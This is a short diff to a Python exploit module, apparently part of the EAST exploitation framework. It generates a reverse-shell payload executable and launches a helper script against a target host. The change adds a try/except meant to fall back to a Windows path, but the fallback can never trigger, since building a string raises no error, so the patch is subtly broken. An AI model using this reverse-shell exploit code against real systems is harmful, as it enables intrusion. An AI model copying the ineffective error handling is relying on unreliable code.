@@ -819,7 +819,10 @@ class exploit(Sploit):
 		shellcode_type = "reverse"
 		shellcode = s.create_shellcode(shellcode_type, make_exe=1,debug=1,filename="payloadEAST")
 #		shellcode = s.create_shellcode(shellcode_type,encode="rot_13", make_exe=1,debug=1,filename="payloadEAST")
-		command = '/usr/bin/python /etc/EAST/help/scriptEAST.py {ip} {pipe}'.format(ip=self.host,pipe=self.pipe)
+		try:
+			command = '/usr/bin/python /etc/EAST/help/scriptEAST.py {ip} {pipe}'.format(ip=self.host,pipe=self.pipe)
+		except:
+			command = 'python c:\EAST\help\scriptEAST.py {ip} {pipe}'.format(ip=self.host,pipe=self.pipe)
 		os.system(command)
 		
 		self.log('Done')
